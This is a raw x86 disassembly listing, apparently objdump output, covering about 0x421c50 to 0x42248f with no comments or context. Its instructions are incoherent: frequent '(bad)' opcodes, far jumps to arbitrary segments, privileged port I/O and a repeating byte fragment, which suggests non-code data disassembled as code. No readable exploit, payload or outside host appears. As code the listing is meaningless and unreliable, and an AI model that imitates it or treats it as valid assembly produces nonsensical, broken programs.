  421c50:	inc    edx
  421c51:	ins    DWORD PTR es:[edi],dx
  421c52:	inc    esi
  421c53:	inc    esi
  421c54:	inc    esi
  421c55:	arpl   WORD PTR [edx+0x47],bx
  421c58:	push   ebp
  421c59:	inc    ebx
  421c5a:	popa   
  421c5b:	push   edx
  421c5c:	dec    esp
  421c5d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421c64:	push   ecx
  421c65:	push   ebx
  421c66:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421c6d:	dec    edx
  421c6e:	jns    0x421cd9
  421c70:	push   edx
  421c71:	inc    ebx
  421c72:	jo     0x421ce9
  421c74:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421c78:	fs push ebx
  421c7a:	inc    ebx
  421c7b:	push   ebp
  421c7c:	push   eax
  421c7d:	ja     0x421cba
  421c7f:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421c83:	mov    ebp,0xa53ddffb
  421c88:	js     0x421c43
  421c8a:	rcr    eax,1
  421c8c:	sub    DWORD PTR [edi],0x7
  421c8f:	aad    0x1
  421c91:	add    BYTE PTR [edx+0x0],bl
  421c94:	add    BYTE PTR [eax],al
  421c96:	xchg   DWORD PTR [edx],eax
  421c98:	pmovmskb esi,mm5
  421c9b:	jmp    0x8e08df4c
  421ca0:	mov    ds:0xb030cc0a,eax
  421ca5:	or     ah,ah
  421ca7:	js     0x421d11
  421ca9:	push   ebp
  421caa:	(bad)  
  421cab:	xor    bl,BYTE PTR [ebp+0x77]
  421cae:	stos   BYTE PTR es:[edi],al
  421caf:	stc    
  421cb0:	out    dx,al
  421cb1:	fs dec edx
  421cb3:	loop   0x421c85
  421cb5:	das    
  421cb6:	mov    al,ds:0x30d18ae4
  421cbb:	cmp    ecx,DWORD PTR [ecx+edi*1-0x3e]
  421cbf:	push   ecx
  421cc0:	sar    ebx,1
  421cc2:	cmp    dh,bh
  421cc4:	pop    ebx
  421cc5:	push   eax
  421cc6:	and    ecx,DWORD PTR [eax+0x4e]
  421cc9:	shl    BYTE PTR [eax],0xa6
  421ccc:	pop    edx
  421ccd:	push   edx
  421cce:	pop    esi
  421ccf:	mov    bh,0x11
  421cd1:	test   DWORD PTR [ecx-0x7bcdae52],ebx
  421cd7:	and    DWORD PTR [ecx-0x3],esp
  421cda:	dec    ebx
  421cdb:	and    BYTE PTR [edi],bh
  421cdd:	fadd   DWORD PTR [edi-0x252c081d]
  421ce3:	add    al,0xb5
  421ce5:	jmp    0xc9833c9c
  421cea:	test   edx,eax
  421cec:	loope  0x421cc2
  421cee:	mov    al,0x9a
	...
  421cfc:	add    BYTE PTR [eax],al
  421cfe:	sub    BYTE PTR [edx+0x57bf52a5],dh
  421d04:	(bad)  
  421d05:	cli    
  421d06:	jl     0x421d6c
  421d08:	xlat   BYTE PTR ds:[ebx]
  421d09:	push   esi
  421d0a:	mov    ch,0x67
  421d0c:	setle  BYTE PTR [ecx-0x2b]
  421d10:	add    DWORD PTR [eax],eax
  421d12:	pop    edx
  421d13:	add    BYTE PTR [eax],al
  421d15:	add    dl,bh
  421d17:	jge    0x421ca0
  421d19:	dec    ebx
  421d1a:	repnz sahf 
  421d1c:	pop    es
  421d1d:	ds pusha 
  421d1f:	shl    BYTE PTR [eax],0xc5
  421d22:	lods   eax,DWORD PTR ds:[esi]
  421d23:	inc    esp
  421d24:	jecxz  0x421d29
  421d26:	mov    edx,0x6498efc8
  421d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d2c:	dec    ebp
  421d2d:	add    BYTE PTR [ebp+0x7c],0x36
  421d31:	mov    ebx,0x4e37b9c5
  421d36:	mov    edi,0x50509871
  421d3b:	mov    es,WORD PTR [eax]
  421d3d:	mov    esp,0x17fcfd76
  421d42:	and    BYTE PTR [edx+0x2b],0x4a
  421d46:	sub    DWORD PTR [edi-0x756dae9c],ebp
  421d4c:	div    BYTE PTR cs:[edi+0x36]
  421d50:	pop    ebx
  421d51:	mov    ebx,DWORD PTR ds:0x6b6722e
  421d57:	push   ss
  421d58:	ds push esi
  421d5a:	or     DWORD PTR [ebx-0x25f786c3],edi
  421d60:	cs mov eax,0x1ac252ba
  421d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d67:	mov    edi,DWORD PTR [esi-0x2c]
  421d6a:	and    al,0xe0
  421d6c:	loop   0x421d3a
  421d6e:	pop    ebx
  421d6f:	xor    al,BYTE PTR [eax]
	...
  421d7d:	add    BYTE PTR [ebx-0x7e80ab],dh
  421d83:	stos   DWORD PTR es:[edi],eax
  421d84:	push   DWORD PTR [edi-0x42]
  421d87:	xchg   esi,eax
  421d88:	push   0xd1e02f57
  421d8d:	mov    bh,0xbb
  421d8f:	aad    0x1
  421d91:	add    BYTE PTR [edx+0x0],bl
  421d94:	add    BYTE PTR [eax],al
  421d96:	lods   al,BYTE PTR ds:[esi]
  421d97:	mov    dl,0xd8
  421d99:	inc    esp
  421d9a:	mov    esp,DWORD PTR [eax+esi*2+0x598a3915]
  421da1:	popa   
  421da2:	push   cs
  421da3:	xchg   ebp,eax
  421da4:	(bad)  
  421da5:	ins    BYTE PTR es:[edi],dx
  421da6:	xchg   DWORD PTR [ebx+0x5d37a022],ebp
  421dac:	or     al,0xfa
  421dae:	repnz xchg edx,eax
  421db0:	adc    al,0xd1
  421db2:	push   esi
  421db3:	ds loopne 0x421d85
  421db6:	xchg   BYTE PTR [ecx+0x67],bh
  421db9:	push   eax
  421dbb:	shr    BYTE PTR [edx-0x24342e9e],cl
  421dc1:	enter  0x51a3,0xfb
  421dc5:	outs   dx,DWORD PTR ds:[esi]
  421dc6:	push   edx
  421dc7:	inc    esp
  421dc8:	jb     0x421db5
  421dca:	inc    BYTE PTR [edi-0x6dcc77bb]
  421dd0:	rcr    BYTE PTR [ebp+0x27405c93],1
  421dd6:	jg     0x421deb
  421dd8:	dec    ebx
  421dd9:	push   edi
  421dda:	retf   
  421ddb:	arpl   bx,dx
  421ddd:	std    
  421dde:	les    ecx,FWORD PTR ds:0x9c2348f
  421de4:	out    0x56,al
  421de6:	or     BYTE PTR [edi],dh
  421de8:	retf   0xf772
  421deb:	call   0x0:0x20aa07b9
	...
  421dfe:	cmp    dh,dl
  421e00:	cmp    ah,BYTE PTR [esi+edi*8]
  421e03:	in     al,dx
  421e04:	fimul  WORD PTR ds:[edi-0x6c53942b]
  421e0b:	dec    ecx
  421e0c:	loope  0x421e5e
  421e0e:	adc    eax,0x5a0001d6
  421e13:	add    BYTE PTR [eax],al
  421e15:	add    dh,cl
  421e17:	sub    cl,ah
  421e19:	idiv   DWORD PTR [edi-0x4f]
  421e1c:	mov    ah,0x14
  421e1e:	push   ds
  421e1f:	inc    edi
  421e20:	push   ss
  421e21:	dec    ebx
  421e22:	mov    bl,0x80
  421e24:	push   0xffffff93
  421e26:	pop    ss
  421e27:	xor    ebx,DWORD PTR [edx+esi*8]
  421e2a:	dec    edi
  421e2b:	inc    ebx
  421e2c:	(bad)  
  421e2d:	sub    al,0x78
  421e2f:	dec    eax
  421e30:	iret   
  421e31:	hlt    
  421e32:	ja     0x421df3
  421e34:	sub    edx,edi
  421e36:	in     al,0x33
  421e38:	ds pusha 
  421e3a:	fcom   QWORD PTR [ebp-0x47]
  421e3d:	sub    DWORD PTR cs:[esp+edx*2+0x19],edx
  421e42:	push   ebp
  421e43:	add    BYTE PTR [ebp-0x52],al
  421e46:	nop
  421e47:	mov    cl,0xbf
  421e49:	lock dec esi
  421e4b:	jl     0x421eb9
  421e4d:	out    dx,eax
  421e4e:	mov    eax,0x26ea90ee
  421e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e54:	js     0x421eb9
  421e56:	mov    edi,0x934faa8f
  421e5b:	xchg   ebx,eax
  421e5c:	cdq    
  421e5d:	or     edx,esp
  421e5f:	addr16 adc dl,bh
  421e62:	ins    BYTE PTR es:[edi],dx
  421e63:	lods   eax,DWORD PTR ds:[esi]
  421e64:	mov    edx,0xac6f7b5d
  421e69:	test   eax,0x3af88a9
  421e6e:	push   ebx
  421e6f:	sldt   WORD PTR [eax]
	...
  421e7e:	fnstenv [esi-0x2490e49a]
  421e84:	std    
  421e85:	neg    BYTE PTR [esi]
  421e87:	sub    esp,DWORD PTR [ebx-0x23]
  421e8a:	inc    ebx
  421e8b:	in     eax,0xfa
  421e8d:	mov    bh,0x6f
  421e8f:	(bad)  
  421e90:	add    DWORD PTR [eax],eax
  421e92:	pop    edx
  421e93:	add    BYTE PTR [eax],al
  421e95:	add    BYTE PTR [esi-0x3695216],dh
  421e9b:	sub    eax,0x2501e4a4
  421ea0:	test   al,0xf5
  421ea2:	mov    al,ds:0x7cd336b4
  421ea7:	int3   
  421ea8:	in     al,dx
  421ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eaa:	mov    ch,0xd5
  421eac:	push   ebx
  421ead:	pop    ss
  421eae:	nop
  421eaf:	cmp    ch,BYTE PTR [eax+0x2c]
  421eb2:	push   es
  421eb3:	pop    ds
  421eb4:	sets   BYTE PTR [ebx]
  421eb7:	add    BYTE PTR [ebx+0x2a3cc993],bl
  421ebd:	rcl    DWORD PTR [edi-0x453cd9b5],1
  421ec3:	dec    eax
  421ec4:	mul    eax
  421ec6:	jne    0x421eec
  421ec8:	test   eax,0xc7bf7adc
  421ecd:	fisub  DWORD PTR [edx+eiz*4]
  421ed0:	in     eax,0x1e
  421ed2:	or     dh,BYTE PTR [ebp-0x46]
  421ed5:	ficom  WORD PTR [ebx-0x10a983b]
  421edb:	jmp    0x421f0a
  421edd:	sub    ch,BYTE PTR [edi-0x3d9316a6]
  421ee3:	pop    eax
  421ee4:	jb     0x421ec6
  421ee6:	sahf   
  421ee7:	push   edi
  421ee8:	dec    ebx
  421ee9:	add    BYTE PTR [eax],dl
  421eeb:	mov    esi,0xf13e61c0
	...
  421efc:	add    BYTE PTR [eax],al
  421efe:	fidiv  DWORD PTR [edx]
  421f00:	xchg   edi,eax
  421f01:	mov    bh,bh
  421f03:	scas   eax,DWORD PTR es:[edi]
  421f04:	fbstp  TBYTE PTR [edx+0x3]
  421f07:	inc    ebp
  421f08:	mov    ds:0x171b4b5c,eax
  421f0d:	aaa    
  421f0e:	leave  
  421f0f:	(bad)  
  421f10:	add    DWORD PTR [eax],eax
  421f12:	pop    edx
  421f13:	add    BYTE PTR [eax],al
  421f15:	add    BYTE PTR [ecx],dh
  421f17:	(bad)  
  421f19:	es das 
  421f1b:	inc    edi
  421f1c:	cmp    DWORD PTR [ebp-0x4f],0xf0fd99e8
  421f23:	adc    dl,ah
  421f25:	les    esi,FWORD PTR [ebx]
  421f27:	push   ds
  421f28:	into   
  421f29:	pop    ecx
  421f2a:	sub    ah,BYTE PTR [esi-0x27c5341]
  421f30:	scas   al,BYTE PTR es:[edi]
  421f31:	push   ss
  421f32:	jne    0x421f73
  421f34:	xor    eax,0x8fdfe066
  421f39:	(bad)  
  421f3b:	inc    esp
  421f3c:	cdq    
  421f3d:	shr    DWORD PTR [edx-0x53],1
  421f40:	sbb    esp,edi
  421f42:	test   al,0xd
  421f44:	std    
  421f45:	push   ecx
  421f46:	mov    al,0xc6
  421f48:	adc    ebx,ebp
  421f4a:	or     eax,0x2e13e309
  421f4f:	scas   eax,DWORD PTR es:[edi]
  421f50:	add    eax,0x4003aa9b
  421f55:	sbb    DWORD PTR [esi],0x4
  421f58:	xchg   ebx,eax
  421f59:	jge    0x421f18
  421f5b:	xor    al,0x44
  421f5d:	ja     0x421f28
  421f5f:	cld    
  421f60:	hlt    
  421f61:	std    
  421f62:	xor    ch,BYTE PTR [ecx+0x0]
  421f65:	jb     0x421f25
  421f67:	pop    es
  421f68:	cdq    
  421f69:	ja     0x421f7f
  421f6b:	and    edx,DWORD PTR [ecx]
  421f6d:	add    DWORD PTR [edx],ebp
  421f6f:	loopne 0x421f71
	...
  421f7d:	add    BYTE PTR [eax-0x1c],cl
  421f80:	add    ebx,DWORD PTR [ebx-0x8270051]
  421f86:	pop    esi
  421f87:	sub    BYTE PTR [eax-0xc3fb371],bl
  421f8d:	in     eax,dx
  421f8e:	and    edx,edi
  421f90:	add    DWORD PTR [eax],eax
  421f92:	pop    edx
  421f93:	add    BYTE PTR [eax],al
  421f95:	add    BYTE PTR [eax+0x29],al
  421f98:	daa    
  421f99:	jg     0x421f8d
  421f9b:	mov    esi,0xac4f6f74
  421fa0:	popa   
  421fa1:	lods   ax,WORD PTR ds:[esi]
  421fa3:	xchg   BYTE PTR [eax],dh
  421fa5:	or     eax,0xdbf92a91
  421faa:	cli    
  421fab:	mov    edx,0x9b0e4f10
  421fb0:	and    BYTE PTR [esi+0x7d],ch
  421fb3:	data16 mov ah,0x1c
  421fb6:	mov    edx,0xce57a4f7
  421fbb:	popf   
  421fbc:	sar    bh,cl
  421fbe:	(bad)  
  421fc0:	jmp    0x5648e76d
  421fc5:	dec    esi
  421fc6:	adc    eax,0x7e031d9b
  421fcb:	jmp    0x3174:0x7b773cc
  421fd2:	dec    edx
  421fd3:	popf   
  421fd4:	jb     0x421f86
  421fd6:	xchg   BYTE PTR [edi+ecx*8+0x4f],cl
  421fda:	cld    
  421fdb:	pop    ecx
  421fdc:	fld    DWORD PTR [eax-0x5f1b44ef]
  421fe2:	xchg   edi,eax
  421fe3:	sub    BYTE PTR [ebp+ecx*8+0x1c36422],al
  421fea:	mov    ch,0x85
  421fec:	xchg   esp,eax
  421fed:	jb     0x422051
  421fef:	push   0x0
	...
  421ffc:	add    BYTE PTR [eax],al
  421ffe:	push   edx
  421fff:	add    al,0xa2
  422001:	xor    dh,0xa6
  422004:	jb     0x421fda
  422006:	ins    DWORD PTR es:[edi],dx
  422007:	xor    dh,BYTE PTR [edx]
  422009:	and    eax,0x6f55a715
  42200e:	jge    0x421fe7
  422010:	add    DWORD PTR [eax],eax
  422012:	pop    edx
  422013:	add    BYTE PTR [eax],al
  422015:	add    BYTE PTR [ebx],ah
  422017:	pop    edi
  422018:	mov    eax,ds:0x3d346465
  42201d:	fdiv   DWORD PTR [eax+ebp*8]
  422020:	test   BYTE PTR [eax+eax*1-0x63],cl
  422024:	addr16 jg 0x422098
  422027:	mov    edi,0x423696aa
  42202c:	inc    esi
  42202d:	pusha  
  42202e:	(bad)  
  42202f:	test   edx,esi
  422031:	js     0x422027
  422033:	cli    
  422034:	les    esp,FWORD PTR [ecx-0xb807387]
  42203a:	out    dx,al
  42203b:	std    
  42203c:	sahf   
  42203d:	js     0x421fef
  42203f:	jle    0x421ff9
  422041:	(bad)  
  422042:	pushf  
  422043:	in     eax,0x78
  422045:	fistp  DWORD PTR [ebx+0x71]
  422048:	repnz sub ch,BYTE PTR [esi-0x6b]
  42204c:	push   0xe46538fd
  422051:	push   0xdfa6d0c3
  422056:	std    
  422057:	cwde   
  422058:	(bad)  
  422059:	iret   
  42205a:	and    DWORD PTR [ecx],edx
  42205c:	mov    ah,0x29
  42205e:	out    0x4d,eax
  422060:	jg     0x4220df
  422062:	mov    bl,0x8e
  422064:	adc    DWORD PTR [esp+ebx*2],ebp
  422067:	in     eax,0x34
  422069:	clc    
  42206a:	adc    eax,0xd528483f
  42206f:	mov    DWORD PTR [eax],0x0
	...
  42207d:	add    BYTE PTR [eax],bh
  42207f:	push   0xffffff96
  422081:	add    edx,esi
  422083:	(bad)  
  422084:	mov    ebp,0xdb4ef67b
  422089:	out    0x86,eax
  42208b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42208c:	mov    al,0xf9
  42208e:	xlat   BYTE PTR ds:[ebx]
  42208f:	xlat   BYTE PTR ds:[ebx]
  422090:	add    DWORD PTR [eax],eax
  422092:	pop    edx
  422093:	add    BYTE PTR [eax],al
  422095:	add    cl,cl
  422097:	retf   0x1007
  42209a:	cmp    eax,0xb743d687
  42209f:	test   DWORD PTR [ecx+0x5b],edx
  4220a2:	xchg   edx,eax
  4220a3:	cdq    
  4220a4:	pusha  
  4220a5:	(bad)  
  4220a6:	js     0x422114
  4220a8:	retf   
  4220a9:	cmp    ecx,edi
  4220ab:	adc    esp,esp
  4220ad:	pop    ecx
  4220ae:	mov    esp,0x4cc37c45
  4220b3:	fwait
  4220b4:	xchg   edx,eax
  4220b5:	sbb    eax,0xcae7abbd
  4220ba:	jne    0x4220be
  4220bc:	mov    bl,0x39
  4220be:	mov    ebp,DWORD PTR [esi]
  4220c0:	cmc    
  4220c1:	stc    
  4220c2:	call   0x76fd7591
  4220c7:	adc    al,0x8
  4220c9:	repnz (bad) 
  4220cb:	mov    dh,0x92
  4220cd:	loope  0x422056
  4220cf:	jmp    0x43559aa4
  4220d4:	out    dx,eax
  4220d5:	stc    
  4220d6:	cmp    BYTE PTR [ebp-0x11d03359],ah
  4220dc:	push   ss
  4220dd:	add    bl,BYTE PTR [eax]
  4220df:	sub    DWORD PTR [esi],0xa40806fb
  4220e5:	hlt    
  4220e6:	pop    edi
  4220e7:	and    BYTE PTR [ebp+0x20],al
  4220ea:	mov    bl,0x15
  4220ec:	dec    ebx
  4220ed:	aam    0xc2
  4220ef:	mov    cl,0x0
	...
  4220fd:	add    cl,ch
  4220ff:	mov    ecx,0xf37a307a
  422104:	jmp    0x4220ff
  422106:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42210a:	ins    DWORD PTR es:[edi],dx
  42210b:	(bad)  
  42210c:	fimul  WORD PTR [edi]
  42210e:	xor    eax,ebx
  422110:	add    DWORD PTR [eax],eax
  422112:	pop    edx
  422113:	add    BYTE PTR [eax],al
  422115:	add    BYTE PTR [ebp+edi*1+0x7972b4be],dh
  42211c:	jmp    0x6a10:0x8ce1a8d8
  422123:	mov    esi,0x2e736293
  422128:	(bad)  
  422129:	mov    ds:0x2cb4457e,al
  42212e:	xchg   esi,eax
  42212f:	inc    edi
  422130:	and    al,0x5a
  422132:	bound  eax,QWORD PTR [edx]
  422134:	aam    0x45
  422136:	cmp    bh,bh
  422138:	add    DWORD PTR [eax-0x2a01047e],esp
  42213e:	inc    esp
  42213f:	je     0x422190
  422141:	xchg   edi,eax
  422142:	hlt    
  422143:	pusha  
  422144:	mov    edx,0x62e38fb2
  422149:	jp     0x422136
  42214b:	and    eax,0x208fe3ce
  422150:	in     eax,dx
  422151:	les    esi,FWORD PTR [ebx+0x1d]
  422154:	xor    esp,DWORD PTR [ebx]
  422156:	inc    ebp
  422157:	inc    esi
  422158:	mov    eax,0x9453b0ee
  42215d:	test   DWORD PTR [eax],edx
  42215f:	pop    edx
  422160:	sbb    eax,0xda6e725
  422165:	push   ecx
  422166:	xor    al,0x77
  422168:	fidiv  WORD PTR [ecx]
  42216a:	pop    ecx
  42216b:	xor    BYTE PTR [edi+0x8b15d1],0x0
	...
  42217e:	pop    ebx
  42217f:	inc    ecx
  422180:	pop    ebx
  422181:	iret   
  422182:	pop    ebx
  422183:	(bad)  
  422185:	aad    0xf
  422187:	ss dec esp
  422189:	dec    esi
  42218a:	int3   
  42218b:	pop    ebx
  42218c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42218d:	or     al,0x8b
  42218f:	fadd   DWORD PTR [ecx]
  422191:	add    BYTE PTR [edx+0x0],bl
  422194:	add    BYTE PTR [eax],al
  422196:	adc    BYTE PTR [ebx+0x21d7407f],bl
  42219c:	push   ecx
  42219d:	xor    eax,0xa34443a0
  4221a2:	fbstp  TBYTE PTR [edx+0x2423af4b]
  4221a8:	cld    
  4221a9:	daa    
  4221aa:	int3   
  4221ab:	clc    
  4221ac:	jae    0x422207
  4221ae:	les    eax,FWORD PTR [edx-0x28]
  4221b1:	ja     0x4221e9
  4221b3:	mov    ebx,0x3ef8bb12
  4221b8:	pop    ecx
  4221b9:	imul   ecx,DWORD PTR [eax-0x5e],0xb39b5301
  4221c0:	cdq    
  4221c1:	inc    ebx
  4221c2:	mov    DWORD PTR [esi+0x1d],ebp
  4221c5:	mov    DWORD PTR [ebx+0x19a2131d],eax
  4221cb:	mov    bl,0x7f
  4221cd:	xor    DWORD PTR [ebx-0x6d1e274b],ebx
  4221d3:	fbstp  TBYTE PTR [ebx+eax*8-0x64]
  4221d7:	xor    eax,DWORD PTR [ebx]
  4221d9:	(bad)  [ecx-0x35d83f61]
  4221df:	mov    al,0xb3
  4221e1:	out    dx,eax
  4221e2:	mov    eax,ds:0x60a93820
  4221e7:	mov    al,0xac
  4221e9:	lods   eax,DWORD PTR ds:[esi]
  4221ea:	test   eax,0xe44b843
  4221ef:	pop    esp
	...
  4221fc:	add    BYTE PTR [eax],al
  4221fe:	fwait
  4221ff:	test   DWORD PTR [ebp+0x3c],esp
  422202:	jg     0x422200
  422204:	(bad)  [edi-0x65be08a1]
  42220a:	sbb    cl,BYTE PTR gs:[ebx]
  42220d:	das    
  42220e:	in     eax,0xd8
  422210:	add    DWORD PTR [eax],eax
  422212:	pop    edx
  422213:	add    BYTE PTR [eax],al
  422215:	add    BYTE PTR [ebp-0x75],ah
  422218:	xor    esp,DWORD PTR [esi]
  42221a:	push   ebp
  42221b:	mov    al,0xff
  42221d:	jge    0x422200
  42221f:	inc    esi
  422220:	leave  
  422221:	jns    0x42224e
  422223:	xchg   esp,esp
  422225:	add    DWORD PTR [edi+eax*2+0x0],edx
  422229:	dec    esi
  42222a:	cli    
  42222b:	popa   
  42222c:	xor    ebx,DWORD PTR [edi-0x7f]
  42222f:	sub    dl,cl
  422231:	pop    edx
  422232:	push   ds
  422233:	test   DWORD PTR [ecx],0xe577d2d5
  422239:	sub    edx,esi
  42223b:	sbb    edx,DWORD PTR [esi+eax*4+0x5]
  42223f:	ficomp DWORD PTR [edx-0x1af6af7b]
  422245:	adc    al,bh
  422247:	jmp    FWORD PTR [edi+0x78]
  42224a:	mov    cl,0xda
  42224c:	jnp    0x42222f
  42224e:	inc    eax
  42224f:	add    ch,ch
  422251:	ret    
  422252:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  422254:	dec    ebp
  422255:	(bad)  
  422256:	adc    ebp,0x5a49bb3c
  42225c:	mov    dh,0xf4
  42225e:	push   cs
  42225f:	sbb    dl,BYTE PTR [edx-0x51]
  422262:	sbb    eax,0xc9df95a7
  422267:	loop   0x42224f
  422269:	les    edx,FWORD PTR [ebp-0x63]
  42226c:	stc    
  42226d:	fstp   TBYTE PTR [edi+0x48]
	...
  42227c:	add    BYTE PTR [eax],al
  42227e:	outs   dx,BYTE PTR ds:[esi]
  42227f:	jae    0x422271
  422281:	retf   0xcbfd
  422284:	jle    0x42227d
  422286:	repz xor eax,0x24b18ce9
  42228c:	stos   BYTE PTR es:[edi],al
  42228d:	dec    eax
  42228e:	aas    
  42228f:	fld    DWORD PTR [ecx]
  422291:	add    BYTE PTR [edx+0x0],bl
  422294:	add    BYTE PTR [eax],al
  422296:	out    dx,eax
  422297:	mov    eax,ds:0x47d38a21
  42229c:	jae    0x422271
  42229e:	out    0x3d,al
  4222a0:	push   eax
  4222a1:	icebp  
  4222a2:	lods   al,BYTE PTR ds:[esi]
  4222a3:	jecxz  0x4222e5
  4222a5:	ins    DWORD PTR es:[edi],dx
  4222a6:	mov    al,bh
  4222a8:	add    DWORD PTR [esi+ecx*8],edx
  4222ab:	ss mov dh,0xf
  4222ae:	sub    DWORD PTR [ebx+0x75309d82],edx
  4222b4:	add    al,0x6a
  4222b6:	cmp    al,0x5c
  4222b8:	mov    ch,0xf3
  4222ba:	xor    DWORD PTR [ebx+esi*8+0xdba6751],0xffffffcf
  4222c2:	js     0x42233b
  4222c4:	retf   0xedc4
  4222c7:	xchg   esp,eax
  4222c8:	mov    ch,0x18
  4222ca:	adc    BYTE PTR [eax-0x281132e7],dh
  4222d0:	out    0xb7,eax
  4222d2:	(bad)  
  4222d3:	adc    cl,al
  4222d5:	mov    cs,WORD PTR [ebx]
  4222d7:	sub    eax,0x19a7770b
  4222dc:	test   eax,0x6c759453
  4222e1:	jbe    0x42233b
  4222e3:	inc    eax
  4222e4:	call   0x1a1c40e4
  4222e9:	xchg   ebp,eax
  4222ea:	jae    0x4222f3
  4222ec:	jbe    0x42232a
  4222ee:	mov    ds:0xfd,eax
	...
  4222fb:	add    BYTE PTR [eax],al
  4222fd:	add    ch,dh
  4222ff:	adc    al,0xae
  422301:	adc    ebp,edi
  422303:	mov    ebx,0x84e6f6fd
  422308:	lds    ebp,FWORD PTR [edx+0x326d6515]
  42230e:	cdq    
  42230f:	fld    DWORD PTR [ecx]
  422311:	add    BYTE PTR [edx+0x0],bl
  422314:	add    BYTE PTR [eax],al
  422316:	lea    esi,[edi]
  422318:	pop    ecx
  422319:	js     0x42238b
  42231b:	dec    ebp
  42231c:	scas   eax,DWORD PTR es:[edi]
  42231d:	imul   ebp,DWORD PTR [edx-0x6a419710],0x712d2c93
  422327:	test   eax,0x85072eaf
  42232c:	xor    BYTE PTR [eax],bh
  42232e:	(bad)
  422331:	aaa    
  422332:	xchg   BYTE PTR [eax+0x79],ch
  422335:	in     al,0x4c
  422337:	popf   
  422338:	push   ebp
  422339:	cmc    
  42233a:	gs ret 
  42233c:	pop    edi
  42233d:	xchg   edi,eax
  42233e:	xchg   ecx,ebp
  422340:	cli    
  422341:	add    ebp,DWORD PTR [edi+0x41d81311]
  422347:	out    0x4c,eax
  422349:	cld    
  42234a:	call   0xda2:0x493bbe09
  422351:	xchg   DWORD PTR [ecx+ebx*1-0x40],ebx
  422355:	cld    
  422356:	add    al,0xed
  422358:	std    
  422359:	(bad)  
  42235a:	fucomi st,st(3)
  42235c:	sbb    al,0x6d
  42235e:	cmp    eax,0xe3c8baee
  422363:	cli    
  422364:	aam    0x96
  422366:	scas   eax,DWORD PTR es:[edi]
  422367:	mov    esp,0x8a923e74
  42236c:	push   ds
  42236d:	jp     0x4222fe
  42236f:	std    
	...
  42237c:	add    BYTE PTR [eax],al
  42237e:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  422384:	mov    edi,0xbb1c16fb
  422389:	rcl    dl,0xaa
  42238c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42238d:	sbb    ebx,esi
  42238f:	fld    DWORD PTR [ecx]
  422391:	add    BYTE PTR [edx+0x0],bl
  422394:	add    BYTE PTR [eax],al
  422396:	jb     0x422385
  422398:	stos   BYTE PTR es:[edi],al
  422399:	aas    
  42239a:	cdq    
  42239b:	push   esi
  42239c:	test   eax,0x1b6c0f44
  4223a1:	dec    esi
  4223a2:	sti    
  4223a3:	std    
  4223a4:	mov    dl,0x26
  4223a6:	das    
  4223a7:	(bad)  
  4223a9:	sbb    DWORD PTR [esi],eax
  4223ab:	push   cs
  4223ac:	mov    ebx,0x30ce7b43
  4223b1:	push   edi
  4223b2:	xor    esi,DWORD PTR [edx+eiz*2-0x6240a377]
  4223b9:	jmp    0x4223fa
  4223bb:	push   cs
  4223bc:	cmp    DWORD PTR [eax+0x33],eax
  4223bf:	mov    BYTE PTR [ebp+0x9],bh
  4223c2:	mov    cl,0xd3
  4223c4:	inc    esp
  4223c5:	adc    edi,ebp
  4223c7:	xchg   esi,eax
  4223c8:	xchg   ebx,eax
  4223c9:	test   DWORD PTR [ecx+edi*4-0x2b],eax
  4223cd:	out    dx,eax
  4223ce:	cs hlt 
  4223d0:	pop    edx
  4223d1:	push   eax
  4223d2:	ret    
  4223d3:	and    dh,0x1f
  4223d6:	sub    ebx,DWORD PTR [ecx+edx*2]
  4223d9:	in     eax,dx
  4223da:	or     ch,BYTE PTR [edx-0x53]
  4223dd:	add    DWORD PTR [edi+0x37a5987f],ebx
  4223e3:	leave  
  4223e4:	in     al,0x93
  4223e6:	mov    ds:0x121c1a93,eax
  4223eb:	xor    al,BYTE PTR [edi+eax*2-0x75]
  4223ef:	cmp    al,BYTE PTR [eax]
	...
  4223fd:	add    ah,dl
  4223ff:	sqrtps xmm6,xmm0
  422402:	(bad)  
  422404:	cmc    
  422405:	das    
  422406:	sbb    BYTE PTR [eax],cl
  422408:	xchg   ebx,eax
  422409:	iret   
  42240a:	fwait
  42240b:	jp     0x42244f
  42240d:	mov    ebp,0x1da4d
  422412:	pop    edx
  422413:	add    BYTE PTR [eax],al
  422415:	add    BYTE PTR [ebx+esi*4],bl
  422418:	icebp  
  422419:	mov    ah,0x55
  42241b:	mov    eax,ds:0x62b544a
  422420:	in     eax,dx
  422421:	daa    
  422422:	mov    ebx,0x4d38bf5b
  422427:	inc    eax
  422428:	cdq    
  422429:	inc    edx
  42242a:	sar    al,0xef
  42242d:	pop    ebx
  42242e:	js     0x4223bc
  422430:	call   0xe07c:0x2d218504
  422437:	jge    0x4224b4
  422439:	sub    esi,DWORD PTR [esi]
  42243b:	retf   
  42243c:	pop    ecx
  42243d:	xor    BYTE PTR [esi],ah
  42243f:	dec    ebx
  422440:	mov    bl,0x78
  422442:	imul   eax,DWORD PTR [edi+0x2b],0xfffffff7
  422446:	cs xchg edi,eax
  422448:	and    DWORD PTR [esi*8+0x330cb0b3],ebp
  42244f:	pusha  
  422450:	xor    BYTE PTR [ebx-0x28828957],dl
  422456:	xlat   BYTE PTR ds:[ebx]
  422457:	mov    edx,0x7727bb4f
  42245c:	adc    DWORD PTR [eax+0x75],ecx
  42245f:	loope  0x422485
  422461:	lea    ebp,[edi-0x43b12238]
  422467:	push   0x57f51b3e
  42246c:	loop   0x4224d2
  42246e:	lds    edx,FWORD PTR [ebx]
	...
  42247c:	add    BYTE PTR [eax],al
  42247e:	int    0x2d
  422480:	xchg   ebp,eax
  422481:	inc    ebx
  422482:	cmc    
  422483:	sti    
  422484:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42248a:	inc    edi
  42248b:	add    eax,DWORD PTR [edx+0x16]
  42248e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42248f:	fiadd  DWORD PTR [ecx]
